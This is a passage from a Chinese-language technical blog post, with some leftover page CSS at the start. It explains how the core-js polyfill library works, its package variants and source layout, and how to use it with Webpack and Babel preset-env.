a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">简介</h2>
<p>在之前我介绍过Babel：<a href="https://link.juejin.cn?target=https%3A%2F%2Fjzplp.github.io%2F2025%2Fbabel-intro.html" target="_blank" title="https://jzplp.github.io/2025/babel-intro.html" ref="nofollow noopener noreferrer">解锁Babel核心功能：从转义语法到插件开发</a>，Babel是一个使用AST转义JavaScript语法，提高代码在浏览器兼容性的工具。但有些ECMAScript并不是新的语法，而是一些新对象，新方法等等，这些并不能使用AST抽象语法树来转义。因此Babel利用core-js实现这些代码的兼容性。</p>
<p>core-js是一个知名的前端工具库，里面包含了ECMAScript标准中提供的新对象/新方法等，而且是使用旧版本支持的语法来实现这些新的API。这样即使浏览器没有实现标准中的新API，也能通过注入core-js代码来提供对应的功能。</p>
<p>像这种通过注入代码实现浏览器没有提供的API特性，叫做Polyfill。这个单词的本意是填充材料，在JavaScript领域中，这些注入的代码就类似“填充材料”一样，帮助我们提高代码的兼容性。另外core-js还提供了一些还在提议中的API的实现。</p>
<h2 data-id="heading-1">core-js使用方式</h2>
<h3 data-id="heading-2">使用前后对比</h3>
<p>要想看到core-js使用前后的效果对比，首先需要确定某个特性和对应的执行环境，在这个环境中对应的特性不存在。我本地是Node.js v18.19.1版本，这个版本并没有实现Promise.try这个方法，因此我们就用这个方法进行实验。首先是没有引入core-js的场景：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* 执行结果
Promise.try(() =&gt; {
           ^
TypeError: Promise.try is not a function
*/</span>
</code></pre>
<p>可以看到没有引入core-js，直接使用Promise.try时，会因为没有该方法而报错。然后再试试引入core-js的效果：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* 输出结果
jzplp!
*/</span>
</code></pre>
<p>可以看到引入core-js后，原本不存在的API被填充了，我们的代码可以正常执行并拿到结果了。这就是core-js提高兼容性的效果。</p>
<h3 data-id="heading-3">单个API引入</h3>
<p>core-js不仅可以直接引入全部语法，还可以仅引入单个API，比如某个对象或某个方法。首先看下只引入Promise对象：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// require('core-js/full') 等于 require('core-js')</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* 输出结果
jzplp!
*/</span>
</code></pre>
<p>然后再看下直接引入对象中的某个方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise/try'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* 输出结果
jzplp!
*/</span>
</code></pre>
<h3 data-id="heading-4">不注入全局对象</h3>
<p>前面展示的场景，core-js都是将API直接注入到全局，这样使用这些API就如环境本身支持一样，基本感受不到区别。但如果我们不希望直接注入到全局时，core-js也提供了使用方式：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js-pure/full/promise'</span>);
promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!2'</span>)
})
<span class="hljs-comment">/* 输出结果
jzplp!
Promise.try(() =&gt; {
           ^
TypeError: Promise.try is not a function
*/</span>
</code></pre>
<p>可以看到，使用core-js-pure这个包之后，可以直接导出我们希望要的API，而不直接注入到全局。此时直接使用全局对象方法依然报错。而core-js这个包虽然也能导出，但它还是会直接注入全局，我们看下例子：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise'</span>);
promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!2'</span>)
})

<span class="hljs-comment">/* 输出结果
jzplp!
jzplp!2
*/</span>
</code></pre>
<p>因此，如果希望仅使用导出对象，还是需要使用core-js-pure这个包。core-js-pure也可以仅导出对象方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> try2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-pure/full/promise/try"</span>);
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">try</span> = try2;
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"jzplp!"</span>);
});

<span class="hljs-comment">/* 输出结果
jzplp!
*/</span>
</code></pre>
<p>因为导出的对象方法不能独立使用，因此在例子中我们还是将其注入到Promise对象后使用。</p>
<h3 data-id="heading-5">特性分类引入</h3>
<p>core-js中包含非常多API特性的兼容代码，有些是已经稳定的特性，有些是还处在提议阶段的，不稳定的特性。我们直接引入core-js会把这些特性全部引入，但如果不需要那些不稳定特性，core-js也提供了多种引入方式：</p>
<ul>
<li>core-js 引入所有特性，包括早期的提议</li>
<li>core-js/full 等于引入core-js</li>
<li>core-js/actual 包含稳定的ES和Web标准特性，以及stage3的特性</li>
<li>core-js/stable 包含稳定的ES和Web标准特性</li>
<li>core-js/es 包含稳定的ES特性</li>
</ul>
<p>这里我们举两个例子尝试下。首先由于ECMAScript标准一直在更新中，有些特性现在是提议，未来可能就已经被列入正式特性了。因此这里的例子需要明确环境和core-js版本。这里我们使用Node.js v18.19.1和core-js@3.47.0版本，以写这篇文章的时间为准。</p>
<p>首先第一个特性是：数组的lastIndex属性，这是一个stage1阶段的API，这里针对不同的引入方式进行尝试：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 不引入core-js尝试</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
<span class="hljs-comment">/* 输出结果
undefined
*/</span>

<span class="hljs-comment">// 引入core-js/full</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/full"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
<span class="hljs-comment">/* 输出结果
1
*/</span>

<span class="hljs-comment">// 引入core-js/actual</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);

<span class="hljs-comment">/* 输出结果
undefined
*/</span>
</code></pre>
<p>首先当不引入core-js时，因为不支持这个API，所以输出undefined。core-js/full支持stage1阶段的API，可以正确输出结果。但core-js/actual仅支持stage3阶段的API，因此还是不支持这个API。</p>
<p>然后我们再看下另外一个API，数组的groupBy方法。这是一个stage3阶段的API：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 不引入core-js尝试</span>
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* 输出结果
const arrNew = arr.groupBy(item =&gt; item.group);
                   ^
TypeError: arr.groupBy is not a function
*/</span>

<span class="hljs-comment">// 引入core-js/actual</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* 输出结果
[Object: null prototype] {
  '1': [ { group: 1, value: 'jz' }, { group: 1, value: 'plp' } ],
  '2': [ { group: 2, value: 'jz2' } ]
}
*/</span>

<span class="hljs-comment">// 引入core-js/stable</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/stable"</span>);
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* 输出结果
const arrNew = arr.groupBy(item =&gt; item.group);
                   ^
TypeError: arr.groupBy is not a function
*/</span>
</code></pre>
<p>可以看到，不引入core-js时不支持，引入了core-js/actual（包含stage3阶段的API）后支持并能输出正确的结果。core-js/stable中不支持又报错了。</p>
<h2 data-id="heading-6">core-js源码结构</h2>
<p>前面描述了很多core-js的引入方式，这里我们看一下源码结构，看看core-js内部是如何组织的。</p>
<h3 data-id="heading-7">core-js源码目录</h3>
<pre><code class="hljs language-erlang" lang="erlang">core-js
├─actual
│   ├─array
│   │  ├─at.js
│   │  ├─concat.js
│   │  └─...
│   ├─set
│   │  └─...
│   └─...
├─es
│   └─...
├─features
│   └─...
├─index.js
└─...
</code></pre>
<p>首先列出core-js源码目录的示意图，可以看到core-js内部有很多目录，对应前面的各种引入方式。这里我们列出每个目录的内容：</p>
<ul>
<li>actual 包含稳定的ES和Web标准特性，以及stage3的特性</li>
<li>es 包含稳定的ES特性</li>
<li>features 没有说明，猜测和full类似</li>
<li>full 所以特性包括早期提议</li>
<li>internals 包内部使用的逻辑</li>
<li>modules 实际特性的代码实现</li>
<li>proposals 包含提议的特性</li>
<li>stable 包含稳定的ES和Web标准特性</li>
<li>stage 按照stage阶段列出提议特性</li>
<li>web 包含Web标准特性</li>
<li>configurator.js 是否强制引入逻辑，后面会描述</li>
<li>index.js 内容为导出full目录，因此导入core-js等于导入core-js/full</li>
</ul>
<h3 data-id="heading-8">层层引用</h3>
<p>在目录中actual, es, full, stable, es是我们已经介绍过的。另外还有web目录仅包含web标准的特性，features和full类似（index.js中直接导出full目录）。</p>
<p>proposals目录包含提议的特性，以特性名来命名文件名。而stage目录中包含0.js, 1.js, 2.js等等，是根据stage阶段来整理的，方便整理和引入对应阶段的特性。</p>
<p>这样整理目录虽然清晰，但这些目录中的特性都是重复的，不可能在每个目录中把特性都实现一遍。因此上面这些目录的文件中，存放的都是实现的引用，并不是特性代码实现本身。真正的实现在modules目录中。modules目录中是以特性名作为命名的文件，文件有固定的前缀名：es.表示ES标准；esnext.表示提议中的标准；web.表示web标准。</p>
<p>这里以我们上面提到过的两个特性为例，看看引用路径，首先是Promise.try：</p>
<ul>
<li>使用者引入 core-js/full/promise/try.js</li>
<li>引入 actual/promise/try.js</li>
<li>引入 actual/promise/try.js</li>
<li>引入 stable/promise/try.js</li>
<li>引入 es/promise/try.js</li>
<li>最终引入 modules/es.promise.try.js</li>
</ul>
<p>然后是groupBy方法：</p>
<ul>
<li>使用者引入 core-js/actual/array/group-by.js</li>
<li>最终引入 modules/esnext.array.group-by.js</li>
</ul>
<p>可以看到，core-js内部的特性是经过层层引入，最终引入具体的实现代码的。</p>
<h3 data-id="heading-9">core-js-pure与core-js-bundle</h3>
<p>除了core-js之外，core-js-pure与core-js-bundle这两个包也提供了兼容性。core-js-pure内部的目录结构与core-js一致，只不过core-js-pure不将特性注入到全局。core-js-bundle比较特殊，它是将core-js代码经过打包后再提供，它的结构如下：</p>
<pre><code class="hljs language-arduino" lang="arduino">core-js-bundle
├─index.js
├─minified.js
├─minified.js.map
└─...
</code></pre>
<p>其中index.js是打包过后的特性集合代码，minified.js是经过压缩混淆后的代码。core-js-bundle只能全部引入并注入到全局，不能引入部分目录或者导出某个属性。</p>
<h2 data-id="heading-10">打包和浏览器效果</h2>
<h3 data-id="heading-11">创建Webpack示例</h3>
<p>首先创建一个Webapck项目，方便后续打包查看效果。首先执行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建项目</span>
npm init -y
<span class="hljs-comment"># 安装webpack依赖</span>
npm add webpack webpack-cli html-webpack-plugin
<span class="hljs-comment"># 安装core-js依赖</span>
npm add core-js core-js-pure core-js-bundle
</code></pre>
<p>创建src/index.js，内容如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
</code></pre>
<p>在package.json文件的scripts中增加命令："build": "webpack"。最后是Webpack配置文件webpack.config.js:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'html-webpack-plugin'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">mode</span>: <span class="hljs-string">'production'</span>, <span class="hljs-comment">// 生产模式</span>
  <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.js'</span>, <span class="hljs-comment">// 源码入口</span>
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>({ <span class="hljs-comment">// 生成HTML页面入口</span>
      <span class="hljs-attr">title</span>: <span class="hljs-string">'jzplp的core-js实验'</span>, <span class="hljs-comment">// 页面标题</span>
    }),
  ],
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">filename</span>: <span class="hljs-string">'main.js'</span>, <span class="hljs-comment">// 生成文件名</span>
    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'dist'</span>),  <span class="hljs-comment">// 生成文件目录</span>
    <span class="hljs-attr">clean</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 生成前删除dist目录内容</span>
  },
};
</code></pre>
<p>命令行运行npm run build，即可使用Webpack打包。在dist目录中生成了两个文件，一个是main.js，里面是打包后的js代码；index.html可以让我们在浏览器查看效果。由于我们没有引入core-js，浏览器没有预置lastIndex这个提议中的特性，因此输出undefined。</p>
<h3 data-id="heading-12">core-js打包</h3>
<p>这里引入core-js，然后打包查看效果。首先是全量引入：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
</code></pre>
<p>此时浏览器输出1，表示core-js注入成功，lastIndex特性生效了。但是我们查看main.js，发现居然有267KB。这是因为它把所有特性都引入了。</p>
<p>如果引入<code>require("core-js/full/array")</code>，此时新特性也可以生效。因为只引入了数组相关特性，因此main.js的大小为59.3KB，比全量引入小很多。</p>
<p>如果引入<code>require("core-js/full/array/last-index")</code>，此时新特性也可以生效。因为只引入了这一个特性，因此main.js的大小为12.2KB。</p>
<h2 data-id="heading-13">Babel与core-js</h2>
<p>从前面打包的例子中可以看到，core-js整个打包进项目中是非常巨大的，可能比你正常项目的大小还要更大。这样明显会造成占用资源更多，页面加载时间变慢等问题。一个解决办法是，只引入我们代码中使用到的特性，以及我们要适配的浏览器版本中不兼容的特性，用不到的特性不打包进代码中。Babel就提供了这样的功能。</p>
<h3 data-id="heading-14">创建Babel示例</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建项目</span>
npm init -y
<span class="hljs-comment"># 安装webpack依赖</span>
npm add @babel/core @babel/cli @babel/preset-env
<span class="hljs-comment"># 安装core-js依赖</span>
npm add core-js core-js-pure core-js-bundle
</code></pre>
<p>创建src/index.js，内容如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>在package.json文件的scripts中增加命令："babel": "babel src --out-dir lib"。最后是Babel配置文件babel.config.json:</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>targets中表示我们需要兼容的浏览器版本。执行npm run babel，生成结果再lib/index.js中，内容如下。可以看到未对core-js做任何处理。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<h3 data-id="heading-15">preset-env配置entry</h3>
<p>@babel/preset-env是一个Babel预设，可以根据配置为代码增加兼容性处理。前面创建Babel示例时已经增加了这个预设，但是没有增加core-js配置。这里我们加一下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"useBuiltIns"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"entry"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.47.0"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>这里增加了corejs版本和useBuiltIns配置，值为entry。配置这个值，会使得@babel/preset-env根据配置的浏览器版本兼容性，选择引入哪些core-js中的特性。这里再执行命令行，结果如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.async-dispose.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.dispose.js"</span>);
<span class="hljs-comment">// ... 更多es特性省略</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/esnext.array.filter-out.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/esnext.array.filter-reject.js"</span>);
<span class="hljs-comment">// ... 更多esnext特性省略</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-exception.stack.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.immediate.js"</span>);
<span class="hljs-comment">// ... 更多web特性省略</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>可以看到core-js被拆开，直接引入了特性本身。在配置chrome: 100版本时，引入的特性为215个。我们修改配置chrome: 140版本时，再重新生成代码，此时引入的特性为150个。可以看到确实时根据浏览器版本选择不同的特性引入。这对于其它core-js的引入方式也生效：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 源代码</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/stable'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;

<span class="hljs-comment">// 生成代码</span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.async-dispose.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.dispose.js"</span>);
<span class="hljs-comment">// ... 更多es特性省略</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-exception.stack.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.immediate.js"</span>);
<span class="hljs-comment">// ... 更多web特性省略</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>我们引入core-js/stable，可以看到生成代码中不引入esnext特性了。在配置chrome: 100版本时，引入的特性为71个，配置chrome: 100版本时，引入的特性为6个。同样的，如果引入换成core-js/full/array，就会只引入数组相关特性，而且也是根据浏览器兼容版本引入。</p>
<h3 data-id="heading-16">preset-env配置usage</h3>
<p>@babel/preset-env的useBuiltIns配置值为usage时，Babel不仅会跟根据配置的浏览器版本兼容性，还会根据代码中实际使用的特性来选择引入哪些core-js中的特性。首先是Babel配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"useBuiltIns"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"usage"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.47.0"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>然后是要处理的代码，注意配置usage时是不需要手动引入core-js的。我们配置不同的Chrome浏览器版本，看看输出结果如何：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 源代码</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// chrome 50 生成代码 </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.array.iterator.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.map.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-collections.iterator.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// chrome 100 生成代码 </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
</code></pre>
<p>首先可以看到，引入core-js中的特性数量变得非常少了，代码中没有用到的特性不再引入。其次不同的浏览器版本引入的特性不一样，因此还是会根据浏览器兼容性引入特性。我们再修改一下源代码试试：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 源代码</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span>{});

